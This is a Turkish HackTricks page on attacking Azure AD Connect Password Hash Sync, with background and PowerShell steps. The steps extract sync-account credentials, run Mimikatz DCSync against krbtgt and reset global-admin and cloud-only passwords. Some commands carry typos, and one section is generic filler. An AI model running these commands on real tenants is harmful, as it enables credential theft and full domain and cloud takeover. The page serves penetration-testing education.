# Az - PHS - Password Hash Sync

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks'e** [**PR göndererek**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunarak hacking ipuçlarını paylaşın.

</details>
{% endhint %}

## Temel Bilgiler

[Belgelerden:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Parola hash senkronizasyonu**, hibrit kimliği gerçekleştirmek için kullanılan oturum açma yöntemlerinden biridir. **Azure AD Connect**, bir kullanıcının parolasının hash'inin hash'ini, şirket içi Active Directory örneğinden bulut tabanlı bir Azure AD örneğine senkronize eder.

<figure><img src="../../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Bu, şirketlerin şirket içi AD'yi Azure AD ile senkronize etmek için kullandığı **en yaygın yöntemdir**.

Tüm **kullanıcılar** ve **parola hash'lerinin hash'i** şirket içinden Azure AD'ye senkronize edilir. Ancak, **düz metin parolalar** veya **orijinal** **hash'ler** Azure AD'ye gönderilmez.\
Ayrıca, **yerleşik** güvenlik grupları (örneğin, domain yöneticileri...) Azure AD'ye **senkronize edilmez**.

**Hash senkronizasyonu** her **2 dakikada** bir gerçekleşir. Ancak, varsayılan olarak, **parola süresi dolumu** ve **hesap** **süresi dolumu** Azure AD'de **senkronize edilmez**. Bu nedenle, **şirket içi parolası süresi dolmuş** (değiştirilmemiş) bir kullanıcı, eski parolayı kullanarak **Azure kaynaklarına erişmeye** devam edebilir.

Bir şirket içi kullanıcı bir Azure kaynağına erişmek istediğinde, **kimlik doğrulama Azure AD'de gerçekleşir**.

**PHS**, **Kimlik Koruması** ve AAD Domain Services gibi özellikler için gereklidir.

## Pivoting

PHS yapılandırıldığında bazı **ayrıcalıklı hesaplar** otomatik olarak **oluşturulur**:

* **`MSOL_<installationID>`** hesabı şirket içi AD'de otomatik olarak oluşturulur. Bu hesaba **Dizin Senkronizasyon Hesapları** rolü verilir (bkz. [belgeler](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), bu da onun **şirket içi AD'de çoğaltma (DCSync) izinlerine sahip olduğu** anlamına gelir.
* **`Sync_<name of on-prem ADConnect Server>_installationID`** hesabı Azure AD'de oluşturulur. Bu hesap, Azure AD'deki **HERHANGİ bir kullanıcının** (senkronize edilmiş veya sadece bulut) **parolasını sıfırlayabilir**.

Önceki iki ayrıcalıklı hesabın parolaları, **Azure AD Connect'in kurulu olduğu sunucudaki** bir SQL sunucusunda **saklanır**. Yöneticiler, bu ayrıcalıklı kullanıcıların parolalarını düz metin olarak çıkarabilirler.\
Veritabanı `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf` konumunda bulunur.

Tablolardan birinden yapılandırmayı çıkarmak mümkündür, biri şifrelenmiş:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**Şifrelenmiş yapılandırma** **DPAPI** ile şifrelenmiştir ve şirket içi AD'deki **`MSOL_*`** kullanıcısının parolalarını ve AzureAD'deki **Sync\_\*** parolasını içerir. Bu nedenle, bunları ele geçirerek AD ve AzureAD'ye yükseltme yapmak mümkündür.

Bu kimlik bilgilerin nasıl saklandığı ve şifresinin çözüldüğüne dair [bu konuşmada](https://www.youtube.com/watch?v=JEIR5oGCwdg) tam bir genel bakış bulabilirsiniz.

### **Azure AD connect sunucusunu** bulma

**Azure AD connect'in kurulu olduğu sunucu** domain'e katılmışsa (belgelerde önerildiği gibi), şu şekilde bulunabilir:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### MSOL\_\* Kötüye Kullanımı

Azure AD Connect, Azure AD ile şirket içi Active Directory arasında kimlik bilgilerini senkronize eden bir araçtır. Bu araç, şirket içi Active Directory'den Azure AD'ye parola hash'lerini senkronize etmek için kullanılır. Bu senkronizasyon işlemi sırasında, MSOL\_\* hesapları oluşturulur ve bu hesaplar, Azure AD Connect'in çalışması için gerekli olan izinlere sahiptir.

MSOL\_\* hesapları, genellikle yüksek ayrıcalıklara sahiptir ve bu hesapların ele geçirilmesi, saldırganların hem şirket içi hem de bulut ortamlarında lateral hareket etmelerine olanak tanır. Bu nedenle, MSOL\_\* hesaplarının güvenliği son derece önemlidir.

#### MSOL\_\* Hesaplarının Tespiti

MSOL\_\* hesaplarını tespit etmek için aşağıdaki PowerShell komutunu kullanabilirsiniz:

```powershell
Get-ADUser -Filter {UserPrincipalName -like "MSOL_*"} -Properties *
```

Bu komut, MSOL\_\* hesaplarını ve bu hesapların özelliklerini listeleyecektir.

#### MSOL\_\* Hesaplarının Kötüye Kullanımı

MSOL\_\* hesaplarının ele geçirilmesi durumunda, saldırganlar bu hesapları kullanarak çeşitli saldırılar gerçekleştirebilirler. Örneğin, saldırganlar bu hesapları kullanarak şirket içi Active Directory'de veya Azure AD'de yeni kullanıcılar oluşturabilir, mevcut kullanıcıların parolalarını değiştirebilir veya diğer hassas işlemleri gerçekleştirebilirler.

MSOL\_\* hesaplarının kötüye kullanılmasını önlemek için, bu hesapların güçlü parolalarla korunması ve düzenli olarak denetlenmesi önemlidir. Ayrıca, bu hesapların yalnızca gerekli izinlere sahip olduğundan emin olunmalıdır.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Bu kimlik bilgilerini elde etmek için [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) kullanabilirsiniz.
{% endhint %}

### Sync\_\* Kötüye Kullanımı

**`Sync_*`** hesabını ele geçirerek herhangi bir kullanıcının (Global Yöneticiler dahil) **şifresini sıfırlamak** mümkündür.
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Ayrıca **yalnızca bulut** kullanıcılarının parolalarını değiştirmek de mümkündür (bu beklenmedik olsa bile)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Bu kullanıcının şifresini de dökebilirsiniz.

{% hint style="danger" %}
Başka bir seçenek, **Sync** kullanıcısının **yetkileri** olan bir hizmet prensibine **ayrıcalıklı izinler atamak** ve ardından bu hizmet prensibine **erişerek** privesc yapmaktır.
{% endhint %}

### Seamless SSO

PHS ile Seamless SSO kullanmak mümkündür, bu da diğer suistimallere karşı savunmasızdır. Şuradan kontrol edin:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Referanslar

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek hacking ipuçlarını paylaşın.

</details>
{% endhint %}
